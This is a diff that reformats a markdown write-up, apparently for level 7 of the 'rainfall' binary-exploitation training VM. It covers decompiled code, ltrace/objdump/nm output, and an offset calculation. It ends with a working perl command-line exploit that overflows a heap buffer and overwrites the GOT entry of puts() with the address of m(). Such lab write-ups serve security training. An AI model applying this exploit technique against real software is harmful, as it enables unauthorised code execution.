@@ -1,7 +1,8 @@
 # Level 7
 
-## the code:
+## The Code:
 
+```c
 //----- (080484F4) --------------------------------------------------------
 int m()
 {
@@ -31,19 +32,20 @@ fgets(c, 68, v3);
 puts("~~");
 return 0;
 }
+```
 
-## the goal
+## The Goal
 
-overwrite \*(v6+1) to put the GOT puts() address in v5+1
-replace &puts() with &m()
-don't work, fgets segfault before
-rewrite c variable as stdout
+- Overwrite `*(v6+1)` to put the GOT `puts()` address in `v5+1`.
+- Replace `&puts()` with `&m()`.
+- Don't work, `fgets` segfault before.
+- Rewrite `c` variable as stdout.
 
-## addresses
+## Addresses
 
-inside rainfall:
+- Inside the rainfall VM:
 
-```sh
+```console
 $ ltrace ./level7
 __libc_start_main(0x8048521, 1, 0xbffff804, 0x8048610, 0x8048680 <unfinished ...>
 malloc(8)                                        = 0x0804a008
@@ -55,7 +57,7 @@ strcpy(0x0804a018, NULL <unfinished ...>
 +++ killed by SIGSEGV +++
 ```
 
-```sh
+```console
 $ objdump -R ./level7
 
 ./level7:     file format elf32-i386
@@ -74,9 +76,9 @@ OFFSET   TYPE              VALUE
 08049934 R_386_JUMP_SLOT   fopen
 ```
 
-on the local computer:
+- On our local computer:
 
-```sh
+```console
 $ nm level7
 08049940 A __bss_start
 08049960 B c
@@ -123,17 +125,16 @@ $ nm level7
          U time@@GLIBC_2.0
 ```
 
-argv1 will be copied at 0x0804a018
-argv2 will be copied at the address stored at 0x0804a028 + 4 = 0x0804a02c
-puts address stored at 0x08049928
-m address is 0x080484f4
-offset is 0x0804a02c - 0x0804a018 = 0x14 (20)
+- `argv1` will be copied at 0x0804a018.
+- `argv2` will be copied at the address stored at 0x0804a028 + 4 = 0x0804a02c.
+- `puts` address stored at 0x08049928.
+- `m` address is 0x080484f4.
+- Offset is 0x0804a02c - 0x0804a018 = 0x14 (20).
+- arg 1: `"A" x 20 . "\x28\x99\x04\x08"`
+- arg 2: `"\xf4\x84\x04\x08`
 
-arg 1: "A" x 20 . "\x28\x99\x04\x08"
-arg 2: "\xf4\x84\x04\x08
+## The Hack:
 
-## the hack:
-
-```sh
+```console
 $ ./level7 $(perl -e 'print "A" x 20 . "\x28\x99\x04\x08"') $(perl -e 'print"\xf4\x84\x04\x08"')
 ```
